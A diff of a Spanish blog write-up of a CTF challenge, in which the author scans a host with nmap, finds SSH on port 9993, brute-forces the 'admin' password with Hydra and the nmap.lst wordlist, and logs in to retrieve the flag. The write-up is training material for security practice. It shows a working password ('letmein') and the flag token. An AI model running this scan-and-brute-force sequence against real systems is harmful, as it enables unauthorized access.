@@ -5,7 +5,7 @@ title:  Reto 3 Hacking CTF ... Flag del puerto 9993/tcp
 
 Bien, nos vamos a la búsqueda de un tercer flag y nos fijaremos por seguir un orden secuencial, en el siguiente puerto abierto descubierto por nmap:  **9993/tcp**
 
-Recordamos con un extracto del escaneo :
+Recordamos un extracto del escaneo :
 
 ``` markdown
 #nmap -p- --open -v -Pn 82.165.37.232 -oG initScan
@@ -21,7 +21,7 @@ Discovered open port 9991/tcp on 82.165.37.232
 Discovered open port 9997/tcp on 82.165.37.232
 ......
 
-**Discovered open port 9993/tcp on 82.165.37.232**
+`Discovered open port 9993/tcp on 82.165.37.232`
 Discovered open port 9996/tcp on 82.165.37.232
 Discovered open port 2222/tcp on 82.165.37.232
 Completed SYN Stealth Scan at 9:22, 98.31s elapsed (65535 total ports)
@@ -32,11 +32,11 @@ PORT      STATE SERVICE
 2222/tcp  open  EtherNetIP-1
 9991/tcp  open  issa
 9992/tcp  open  issc
-9993/tcp  open  palace-2
+`9993/tcp  open  palace-2`
 
 ```
 
-La definición del servicio *palace-2* que corre sobre el puerto 9993/tcp ,reconocido por nmap no nos dice nada. Lanzo una conexión telnet al puerto 993/TCP para ver cómo me responde y .... 
+La definición del servicio *palace-2* que corre sobre el puerto 9993/tcp ,reconocido por nmap no nos dice nada. Lanzo una conexión telnet al puerto 9993/TCP para ver cómo me responde y .... 
 
 ``` 
 root@ip-172-31-29-174:/home/ubuntu# telnet 82.165.37.232 9993
@@ -50,7 +50,24 @@ SSH-2.0-OpenSSH_7.7
 ¡Mira! : Nos ofrece una conexion SSH .
 Así pues el servicio 9993/tcp, concretamente está a la escucha para ofrecer un servidor **SSH-2.0-OpenSSH_7.7** , pero se ha intentado ofuscar el servicio de conexión segura sustituyéndolo por el 443/tcp habitual:
 
-Vale pues intentaremos acceder. Por fuerza bruta  y empleando una herramienta de descubrimiento de credenciales de acceso sobre servicios en red como Hydra, comprobando claves de diccionario cuyo origen es el listado de claves **nmap.lst** (obviamente de nmap), y concretamente sobre servidor el servidor SSH. No conocemos ninguna credencial de usuario ni password, pero vamos a intentar descubrir la contraseña tomando como prueba el usuario clásico y habitual, **admin**.... y (manda narices), tras varios minutoas,  tenemos **éxito** :
+Intentamos una conexión sin conocer credenciales
+
+```
+root@ip-172-31-29-174:/home/ubuntu# ssh -p 9993 usuariop@82.165.37.232
+##########################################################
+#                                                          #
+#                                                          #
+# Acceso denegado. Solo el usuario <admin> puede conectar.
+#
+#                                                          #
+#                                                          #
+############################################################
+```
+
+Vale pues intentaremos acceder con el usuario **admin**. Por fuerza bruta  y empleando una herramienta de descubrimiento de credenciales de acceso sobre servicios en red como Hydra, comprobando claves de diccionario cuyo origen es el listado de claves **nmap.lst** (obviamente de nmap), y concretamente sobre servidor el servidor SSH.  Como ya sabemos que el usuario es **admin** por la pista del banner, vamos a intentar descubrir la contraseña.
+
+Tras varios minutos de espera de pruebas de **Hydra** , tenemos **éxito** :
+
 
 ```markdown
 
@@ -89,6 +106,9 @@ Para ver la imagen gráfica de la operación observamos la captura original:
 
 <img src="{{ site.baseurl }}/public/Reto3_ssh.png">
 
+
+Vamos conectarnos entonces por SSH a ese puerto con usuario **admin** y password **letmein** :
+
 ```
 
 root@ip-172-31-29-174:/home/ubuntu# ssh -p 9993 admin@82.165.37.232
@@ -104,5 +124,7 @@ Token 3: 8842130e8deeee7f821e77e14d69cb98
 Connection to 82.165.37.232 closed.
 
 ```
+Perfecto, ya hemos obtenido el tercer flag de la CTF:
+
 
 >Token 3: 8842130e8deeee7f821e77e14d69cb98
